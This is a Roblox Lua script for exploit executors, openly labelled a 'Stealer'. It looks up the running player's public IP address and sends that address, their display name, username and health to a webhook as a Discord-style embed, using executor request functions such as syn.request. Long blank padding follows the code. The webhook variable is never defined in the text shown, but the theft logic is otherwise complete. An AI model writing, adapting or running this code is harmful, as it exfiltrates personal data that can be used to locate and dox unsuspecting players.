local players = game:GetService("Players")
local httpService = game:GetService("HttpService")
local localPlayer = players.LocalPlayer

local function getIP()
	local url = "https://ipv4.jsonip.com/"
	local response = game:HttpGet(url)
	local ipData = httpService:JSONDecode(response)
	return ipData.ip
end

local function getInfo()
	local url = "https://ipv4.jsonip.com/"
	local response = game:HttpGet(url)
	local ipData = httpService:JSONDecode(response)
	local main = 'https://ipapi.co/' .. ipData.ip .. '/json/'
	return ipData.ip
end

local ip = getIP()
local playerDisplay = localPlayer.DisplayName
local name = localPlayer.Name
local health = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") and localPlayer.Character:FindFirstChildOfClass("Humanoid").Health or "N/A"

local function steal()
	local data = {
		["embeds"] = {{
			["title"] = "**" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**",
			["description"] = "Place Id: " .. game.PlaceId .. " | Game Name: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " | Game Version: " .. game.PlaceVersion,
			["type"] = "rich",
			["color"] = tonumber(0xFF0000),
			["url"] = "https://www.roblox.com/games/" .. game.PlaceId,
			["fields"] = {{
				["name"] = "Local Player Status",
				["value"] = "Display: " .. playerDisplay .. ", Name: " .. name .. ", Health: " .. health,
				["inline"] = true
			}, {
				["name"] = "Stealer Info",
				["value"] = "IP Info: " .. "https://ipapi.co/" .. ip .. "/json/",
				["inline"] = true
			}},
			["footer"] = { ["text"] = "easy steal" },
			["author"] = { ["name"] = "| / - | \\ - | Stealer | / - | \\ - |" }
		}}
	}

	local jsonData = httpService:JSONEncode(data)
	local requestFunction = http_request or request or HttpPost or http.request or syn.request

	local requestData = {
		Url = Webhook,
		Body = jsonData,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		}
	}

	requestFunction(requestData)
end

steal()
























      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























      





      
























